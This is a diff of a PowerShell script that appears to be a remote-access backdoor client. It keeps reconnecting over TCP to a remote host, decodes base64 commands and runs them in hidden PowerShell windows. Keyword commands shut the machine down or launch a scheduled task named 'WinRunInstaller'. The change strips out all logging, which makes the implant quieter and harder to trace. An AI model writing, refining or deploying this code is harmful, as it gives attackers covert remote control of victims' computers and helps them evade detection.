@@ -27,43 +27,25 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
-$SCRIPT_VERSION = "ab44043"
+$SCRIPT_VERSION = "7cc3a4b"
 $clientVersion = $SCRIPT_VERSION
-
-$logDir = "$env:APPDATA\Microsoft\run"
-if (-not (Test-Path $logDir)) {
-  New-Item -ItemType Directory -Path $logDir -Force | Out-Null
-}
-$logFile = "$logDir\run.log"
-
-function Log-Msg($msg) {
-  $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg"
-  Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
-}
-
-Log-Msg "[INFO] run.ps1 started. Acquired mutexes."
-Log-Msg "[INFO] Client: $uniqueUser, Version: $clientVersion"
 
 function Execute-CommandPayload ($r) {
   if ($r.run -eq $true -and -not [string]::IsNullOrEmpty($r.cmd)) {
     $c = [System.Text.Encoding]::UTF8.GetString(
       [System.Convert]::FromBase64String($r.cmd)
     )
-    Log-Msg "[INFO] Received command payload. Command: $c"
 
     if ($c -match "panic") {
-      Log-Msg "[INFO] Command matched 'panic'. Exiting."
       exit
     }
     elseif ($c -match "altf4") {
-      Log-Msg "[INFO] Command matched 'altf4'. Shutting down system."
       Start-Process `
         -FilePath "shutdown" `
         -ArgumentList "/s", "/t", "0" `
         -WindowStyle Hidden
     }
     elseif ($c -match "sauce") {
-      Log-Msg "[INFO] Command matched 'sauce'. Starting WinRunInstaller scheduled task."
       Start-ScheduledTask `
         -TaskName "WinRunInstaller"
     }
@@ -75,7 +57,6 @@ function Execute-CommandPayload ($r) {
         "Hidden"
       }
 
-      Log-Msg "[INFO] Executing PowerShell command (WindowStyle: $style)..."
       Start-Process powershell.exe `
         -ArgumentList @(
         "-NoProfile",
@@ -91,12 +72,10 @@ function Execute-CommandPayload ($r) {
 try {
   while ($true) {
     try {
-      Log-Msg "[INFO] Connecting to TCP socket $VPS_HOST:$VPS_PORT..."
       $tcpClient = New-Object System.Net.Sockets.TcpClient
       $tcpClient.Connect($VPS_HOST, $VPS_PORT)
 
       if ($tcpClient.Connected) {
-        Log-Msg "[INFO] TCP connection established successfully."
         $stream = $tcpClient.GetStream()
         $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
         $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
@@ -108,7 +87,6 @@ try {
         while ($tcpClient.Connected) {
           $line = $reader.ReadLine()
           if ($null -eq $line) {
-            Log-Msg "[INFO] Server closed TCP connection."
             break
           }
 
@@ -117,14 +95,12 @@ try {
             continue
           }
 
-          Log-Msg "[INFO] Received TCP payload: $line"
           $r = $line | ConvertFrom-Json
           Execute-CommandPayload $r
         }
       }
     }
     catch {
-      Log-Msg "[ERROR] TCP Connection Error: $($_.Exception.ToString())"
     }
     finally {
       if ($tcpClient) {
@@ -133,7 +109,6 @@ try {
       }
     }
 
-    Log-Msg "[INFO] Reconnecting in 3 seconds..."
     Start-Sleep -Seconds 3
   }
 }
